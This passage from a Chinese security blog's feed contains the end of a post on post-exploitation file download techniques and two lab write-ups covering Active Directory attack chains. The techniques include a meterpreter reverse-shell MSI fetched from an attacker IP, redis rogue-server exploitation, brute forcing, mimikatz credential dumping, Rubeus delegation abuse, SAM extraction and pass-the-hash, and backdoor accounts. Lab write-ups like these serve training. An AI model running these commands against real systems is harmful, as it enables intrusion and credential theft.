class="comment">&#x27;  </span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">with</span></span><br></pre></td></tr></table></figure><p>把这段脚本保存为test.vbs然后运行</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure><h3 id="FTP">FTP</h3><p>这个需要攻击者开启一个ftp服务，然后在目标服务器上直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp ip </span><br><span class="line"></span><br><span class="line">get file</span><br></pre></td></tr></table></figure><h3 id="bitsadmin">bitsadmin</h3><p>第一种</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob1 /download /priority normal http://<span class="number">192.168</span>.<span class="number">109.128</span>/test/test.txt C:\Users\baji\Desktop\test.txt</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getfile http://<span class="number">192.168</span>.<span class="number">1.103</span>/test/test.txt C:\Users\snowwolf\Desktop\test.txt</span><br></pre></td></tr></table></figure><p>第三种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getpayload http://192.168.1.103/test/test.txt C:\Users\snowwolf\Desktop\test.txt</span><br></pre></td></tr></table></figure><p>第四种</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal <span class="string">&quot;http://192.168.1.103/test/test.txt&quot;</span> <span class="string">&quot;C:\Users\snowwolf\Desktop\test.txt&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Certuil">Certuil</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">1.103</span>/test/test.exe test.exe</span><br></pre></td></tr></table></figure><h3 id="hh-exe">hh.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hh.exe http://<span class="number">192.168</span>.<span class="number">1.103</span>/test/test.txt</span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212171545323.png" class=""><p>下载的文件是以html的方式进行打开，但是如果是应用程序的话发现就可以做到下载的效果</p><h3 id="Msiexec-exe">Msiexec.exe</h3><p>系统进程，用于安装MSI，一般更新或者安装软件时会碰到，支持远程下载功能<br>先在Kali Linux端生成MSI文件，输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.103 lport=7777 -f msi &gt; test.msi</span><br></pre></td></tr></table></figure><p>此时在msf中开启监听</p><p>然后在windows下载msi文件，因为msi具有下载执行的特性所以会直接拿到会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /q /i http://192.168.1.103/test.msi</span><br></pre></td></tr></table></figure><p>就先记录这些。<br>参考文章<br><a href="https://fushuling.com/index.php/2023/10/21/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDlinux%E7%AF%87/">https://fushuling.com/index.php/2023/10/21/后渗透之文件下载linux篇/</a><br><a href="https://www.freebuf.com/articles/network/246353.html">https://www.freebuf.com/articles/network/246353.html</a><br><a href="https://pino-hd.github.io/2018/06/10/%E6%B8%97%E9%80%8F%E4%B8%AD15%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95/">https://pino-hd.github.io/2018/06/10/渗透中15种文件下载的方法/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Linux&quot;&gt;Linux&lt;/h2&gt;
&lt;h3 id=&quot;wget&quot;&gt;wget&lt;/h3&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Brute4Road-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/9b47c8fc.html"/>
    <id>https://oceanzbz.github.io/post/9b47c8fc.html</id>
    <published>2025-02-12T08:15:28.000Z</published>
    <updated>2025-03-05T12:35:10.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="外网突破">外网突破</h2><p>使用fsacn扫描到开启了6379端口</p><img src="/post/9b47c8fc/IMAGE20250212224122226.png" class=""><p>尝试redis主从复制漏洞，可以直接利用<a href="https://github.com/n0b0dyCN/redis-rogue-server">脚本</a>进行攻击，也可以用别人写好的工具liqun，工具很多自己选择就行。</p><img src="/post/9b47c8fc/IMAGE20250212224358781.png" class=""><p>拿到shell之后创建一个伪终端，或者也可以直接用pwncat进行监听也可以</p><img src="/post/9b47c8fc/IMAGE20250212224413135.png" class=""><h2 id="提权">提权</h2><p>还是常规的suid提权走一遍看看有什么可以利用的吗</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><img src="/post/9b47c8fc/IMAGE20250212224636322.png" class=""><p>发现一个base64可以用他来读文件然后解密或者也可以直接利用管道符在次解密也可以</p><img src="/post/9b47c8fc/IMAGE20250212224818888.png" class=""><h2 id="内网渗透">内网渗透</h2><p>将fscan上传到机器开启扫描，结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:7680 open</span><br><span class="line">[*] alive ports len is: 21</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.3</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DC</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.2.3</span></span><br><span class="line">[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.16</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]MSSQLSERVER</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.2.16</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.34</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]CLIENT01</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.2.34</span></span><br><span class="line">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[+] ftp 172.22.2.7:21:anonymous </span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]pub</span></span><br><span class="line">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br><span class="line">已完成 21/21</span><br><span class="line">[*] 扫描结束,耗时: 12.83655425s</span><br></pre></td></tr></table></figure><p>有一个wordpress站点，搭建个代理存在wpcargo，去网上搜索一下利用方式</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p><p>然后连接蚁剑，注意选在cmdlinux类型</p><img src="/post/9b47c8fc/IMAGE20250212230957467.png" class=""><p>连接成功之后，去翻找配置文件找到数据库密码连接一下</p><img src="/post/9b47c8fc/IMAGE20250212231131919.png" class=""><img src="/post/9b47c8fc/IMAGE20250212231246234.png" class=""><p>可以看到有flag02同时还有一个提示去看看</p><img src="/post/9b47c8fc/IMAGE20250212231333568.png" class=""><p>可以看到这里面存在很多密码，同时在我们之前扫描出来的结果中是有1433端口开放的所以去爆破一下拿这个字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 172.22.2.16 -m mssql -pwdf test.txt </span><br><span class="line">[+] mssql:172.22.2.16:1433:sa ElGNkOiC</span><br></pre></td></tr></table></figure><img src="/post/9b47c8fc/IMAGE20250212232103653.png" class=""><p>然后我们去连接一下使用mdut</p><img src="/post/9b47c8fc/IMAGE20250212232403963.png" class=""><p>激活下ole组件为了方便传文件，然后提权使用sweetpotato</p><img src="/post/9b47c8fc/IMAGE20250212233317234.png" class=""><p>然后添加一个管理员用户方便我们rdp上去</p><img src="/post/9b47c8fc/IMAGE20250212234025469.png" class=""><p>找到第三个flag</p><h2 id="约束委派">约束委派</h2><img src="/post/9b47c8fc/IMAGE20250212234313894.png" class=""><p>存在域里，所以进行域内信息收集。先传一个mimikatz抓一下hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><img src="/post/9b47c8fc/IMAGE20250212235759831.png" class=""><p>找到该域用户使用该用户进行操作，收集下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.2.3 -u MSSQLSERVER$ -H c6079e634a0d18295242dd87fe36d1c2</span><br></pre></td></tr></table></figure><img src="/post/9b47c8fc/IMAGE20250213001634148.png" class=""><p>发现该域用户有到dc的约束委派。使用Rubeus申请访问自身的服务票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:c6079e634a0d18295242dd87fe36d1c2 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><img src="/post/9b47c8fc/IMAGE20250213000922589.png" class=""><p>然后注入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3CUugl3aBQFwSyeWPVU3r1iQikk38+cvJPBpGqAKvP76nMVHBN/rVjb5/Q/Ts7AFKQ1oXLtaDOde73zFXItw+UIgnNH+GpMr0f9NjHxps0PrODnbqY9DIx5H2yU8FOAcxoOlcncc3xKg8uMZJDVxhwa3emIr6QLbxZlPRCsZouqopahTWwbO9BJShmG9QUMQSbrC4+kbvtWX7iVigBlhEd1wk3ZsOfO/JLY0aOCv1+r3PQjITUZnEyrRHtbqt6qRpFhmUTNDqMH4mKqlW7NRwN0S0T8anc4KKFs6VIrROAw8/nzGrw9MNsafoFI2xtA3D1iUHMhNjVGsOZZL/g2YKGC/Y1eglyTiODpMkKittC2QPNmbQZRUhrZHm3M4g01BuO+pLRv8TGwxTH+oemX90PKAX8aSL+zOa9LzFGMoqYTI10/Vd0X0GUEz55/+URZHpMWvww7Uf5yrhvENDzVS8UKW0JFPtJrfCyBYBYEVk821C5DKybrp79R7TYo8BWAQ6lN+I4h5oisy+LrJyiqRexBQKwIx4WT5y8mUugTOSENFI8CJ2P1c/TkqxI/epb99/jJzANOsy0ueVFBOR7fuw3zkUPBL7eYQ4vJ8ySC4sDp1GFwKwS/7SyiMS3Af6Go7NHK9UItzi8lco2e5sgk+ln5bT/B5PE7N7R3QiGoh3mzd3y83cqKAjb05z4qq4JYfZB0+zzfy+7d4DrS1SpxVVGKA/mZK0Rjy82FruT+/13SJIZTqXl80fEJdl41o5HvNIhLKCvSEGd3YLSEqoP6Qll/n6urFmbNJWcvJ3debS89WyR1DxxJp8mao16iCnOlUIZM2ocmRrOmkd/RqINeO8gRSyMjbOnS5aIfJ8TLgtq+mD0bAVcoKzeZh6Y4rEDfhOukgkxmnFBTl5OwjeXn+0lUDmysLpbUbgFEz/a1r4QDLL/PhSQeIPt2jgNFwH8JDgP5AgE+QfGp2ml0GLAxxhJ3dtVKuLabrl9nSd0NMo9goNJV3lMKct+u5M8CxKtrQ3lsiDIDZpi8I5E7gTb+MxIiBmId4JeA6MBBzYhbGpAxXr0zZx6eKai5Ad1y+PgaSBGWILnygqudKRhXpA2CaNWEELLoaYF3iRp7w+o1QbQYa+WibRMpqRSADiNFvYoVdpzuZwXR12RBYac/o+7ElIlfKk8dwqQT+H/ybkLqen21RAkrXm3h5v7IaUwJxeGwvlQmy3lxcPbWrRgrhBpDWW+FXl3geizhaWN6uVQsGeutrnxF7oNqbDZSwPPM8FMrKCSgNhTQ0EYUQiB3XiNGilK2HZmIEvRVHFs0+46sscgOyj+pq3n7lwKWVTwGgMCDPCRIXbNpftw342Y/tfKb/I0QU/5gUFhVhKgiOjueA7hFewY0SwsD5kuKd1HOSQvOzryQ6ibLuz4mUX9mRviHLWNRkW5cbXBI6hC1Cig6RQ+T+5uDoyHDhIpmSR0FmujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD9yM0YSZKbTVTJUPKro0ACoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDIxMjE2MTA0N1qmERgPMjAyNTAyMTMwMjEwNDdapxEYDzIwMjUwMjE5MTYxMDQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p>然后访问域控获取flag</p><img src="/post/9b47c8fc/IMAGE20250213001312486.png" class=""><p>参考：<br><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;外网突破&quot;&gt;外网突破&lt;/h2&gt;
&lt;p&gt;使用fsacn扫描到开启了6379端口&lt;/p&gt;
&lt;img src=&quot;/post/9b47c8fc/IMAGE20250212224122226.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;尝试redis主从复制漏洞，可以直接利用&lt;a </summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Delegation-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/2feca376.html"/>
    <id>https://oceanzbz.github.io/post/2feca376.html</id>
    <published>2025-02-10T10:03:11.000Z</published>
    <updated>2025-03-07T03:22:00.621Z</updated>
    
    <content type="html"><![CDATA[<h2 id="外网打点">外网打点</h2><p>利用 cve-2021-42643,直接访问路由/admin admin 123456登入后台</p><img src="/post/2feca376/IMAGE20250210180835438.png" class=""><p>找到模版选项</p><img src="/post/2feca376/IMAGE20250210181131413.png" class=""><p>可以直接进行命令执行，直接写一个一句话shell进去</p><img src="/post/2feca376/IMAGE20250210181827682.png" class=""><p>蚁剑连接成功。</p><h2 id="提权">提权</h2><p>suid 提权看一下</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><img src="/post/2feca376/IMAGE20250210182203907.png" class=""><p>有diff可以用这个来查看文件</p><img src="/post/2feca376/IMAGE20250210182241625.png" class=""><h2 id="内网渗透">内网渗透</h2><p>可以看到有一个提示是windows的域用户，我们传一个fscan扫描一下内网<br>扫描记录如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7:88 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.45</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]FILESERVER</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.19</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DC01</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.7</span></span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.4.7(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68069  title:中文网页标题</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure><p>根据前面flag的提示可以扫描一下win19这台机器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.45:515 open</span><br><span class="line">172.22.4.45:3389 open</span><br><span class="line">172.22.4.45:15774 open</span><br><span class="line">172.22.4.45:47001 open</span><br><span class="line">172.22.4.45:49664 open</span><br><span class="line">172.22.4.45:49665 open</span><br><span class="line">172.22.4.45:49667 open</span><br><span class="line">172.22.4.45:49666 open</span><br><span class="line">172.22.4.45:49668 open</span><br><span class="line">172.22.4.45:49669 open</span><br><span class="line">172.22.4.45:49671 open</span><br><span class="line">172.22.4.45:49675 open</span><br><span class="line">172.22.4.45:49676 open</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.45</span></span><br><span class="line">[*] WebTitle http://       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.4.45:47001  code:404 len:315    title:Not Found</span><br></pre></td></tr></table></figure><p>发现开启了3389端口，那么我们去爆破一下密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l win19\Adrian -P /usr/share/wordlists/rockyou.txt 172.22.4.45 rdp</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br></pre></td></tr></table></figure><p>但是这两个我试了都他妈的报错不知道为啥。然后看了大佬的博客用了下密码<br>babygirl1</p><h2 id="注册表提权">注册表提权</h2><p>然后使用 rdesktop 登录上去会提示更改密码这里要提一个<a href="https://forum.butian.net/share/865">远程更改密码</a><br>登录上来之后桌面有一个文件夹是PrivescCheck扫描之后的结果，看一下html即可发现存在注册表提权。</p><img src="/post/2feca376/IMAGE20250211180645966.png" class=""><p>用msfvenom生成一个木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>还要在写一个sam.bat文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system </span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam </span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>修改注册表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Users\Adrian\Desktop\a.exe&quot;</span> /f</span><br></pre></td></tr></table></figure><p>然后在cmd中运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211182043219.png" class=""><p>此时桌面就会出现三个文件然后拖到kali中解密一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45 -r disk:test=/root/</span><br></pre></td></tr></table></figure><p>这样在远程连接的时候会共享kali的文件夹所以可以直接将目标服务器的文件拖出来，来解密这三个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptyhon3 secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211183812308.png" class=""><p>得到账户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90</span><br></pre></td></tr></table></figure><p>使用admin账户的hash打一下pth拿下第二个flag</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py administrator@<span class="number">172.22</span>.<span class="number">4.45</span> <span class="literal">-hashes</span> <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot;</span> <span class="literal">-codec</span> gbk</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211184230211.png" class=""><p>添加个后门用户方便后续操作</p><img src="/post/2feca376/IMAGE20250211191020272.png" class=""><p>然后我们利用机器账户的hash去收集下域内的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90&quot; -d 